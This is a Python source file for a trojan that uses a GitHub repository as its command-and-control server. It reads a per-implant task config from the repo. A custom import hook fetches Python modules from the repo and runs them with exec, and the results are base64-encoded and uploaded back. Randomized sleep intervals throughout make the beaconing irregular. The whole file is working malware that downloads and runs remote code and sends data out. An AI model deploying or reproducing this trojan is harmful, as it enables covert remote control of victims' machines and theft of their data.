import json
import base64
import sys
import time
import importlib
import random
import threading
import queue
import os
import requests
import logging

trojan_id = "abc"
trojan_config = f"{trojan_id}.json"
data_path = f"data/{trojan_id}/"
configured = False
task_queue = queue.Queue()

logging.basicConfig(level=logging.INFO, format="[*] %(message)s")

GITHUB_TOKEN = input("Enter your GitHub token: ").strip()
GITHUB_USERNAME = input("Enter your GitHub username: ").strip()
GITHUB_REPO = input("Enter your repository name: ").strip()
GITHUB_BRANCH = input("Enter your branch name: ").strip()


def get_github_file_contents(filepath):
    """Retrieve file content from GitHub using GitHub API"""
    url = f"https://api.github.com/repos/{GITHUB_USERNAME}/{GITHUB_REPO}/contents/{filepath}?ref={GITHUB_BRANCH}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }

    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        content_data = response.json()

        if content_data.get("encoding") == "base64":
            return base64.b64decode(content_data["content"])
        else:
            return content_data["content"].encode("utf-8")

    except requests.exceptions.RequestException as e:
        logging.error(f"Error retrieving {filepath}: {e}")
        return None


def get_trojan_config():
    """Retrieve and parse trojan configuration"""
    global configured
    config_json = get_github_file_contents(trojan_config)
    if config_json is None:
        return []

    try:
        config = json.loads(config_json)
        configured = True

        for task in config:
            if task["module"] not in sys.modules:
                try:
                    importlib.import_module(task["module"])
                except ImportError as e:
                    logging.error(f"Failed to import {task['module']}: {e}")
        return config

    except (json.JSONDecodeError, base64.binascii.Error) as e:
        logging.error(f"Config file error: {e}")
        return []


def store_module_results(data):
    """Store module execution results to GitHub"""
    remote_path = f"data/{trojan_id}/{random.randint(1000, 100000)}.data"
    encoded_data = base64.b64encode(data.encode("utf-8")).decode("utf-8")

    url = f"https://api.github.com/repos/{GITHUB_USERNAME}/{GITHUB_REPO}/contents/{remote_path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }

    payload = {
        "message": "Upload module result",
        "content": encoded_data,
        "branch": GITHUB_BRANCH
    }

    try:
        response = requests.put(url, headers=headers, json=payload)
        response.raise_for_status()
        logging.info(f"Successfully uploaded result to {remote_path}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Error uploading results: {e}")


class GitImporter(importlib.abc.MetaPathFinder):
    """Custom import hook to load modules from GitHub"""
    def __init__(self):
        self.current_module_code = None

    def find_spec(self, fullname, path, target=None):
        if configured:
            logging.info(f"Attempting to retrieve module: {fullname}")
            new_library = get_github_file_contents(f"modules/{fullname}.py")

            if new_library:
                self.current_module_code = new_library.decode("utf-8")
                return importlib.util.spec_from_loader(fullname, importlib.util.LazyLoader(self))

        return None

    def create_module(self, spec):
        return None

    def exec_module(self, module):
        if self.current_module_code:
            try:
                exec(self.current_module_code, module.__dict__)
            except Exception as e:
                logging.error(f"Module execution error: {e}")

    def load_module(self, name):
        spec = self.find_spec(name)
        if spec:
            module = importlib.util.module_from_spec(spec)
            sys.modules[name] = module
            self.exec_module(module)
            return module
        return None

    @staticmethod
    def module_runner(module_name):
        task_queue.put(1)
        try:
            result = sys.modules[module_name].run()
            if result:
                store_module_results(result)
        except Exception as e:
            logging.error(f"Module run error ({module_name}): {e}")
        finally:
            task_queue.get()


sys.meta_path.insert(0, GitImporter())

while True:
    if task_queue.empty():
        config = get_trojan_config()

        for task in config:
            t = threading.Thread(target=GitImporter.module_runner, args=(task["module"],))
            t.start()
            time.sleep(random.randint(1, 10))

    time.sleep(random.randint(1000, 10000))
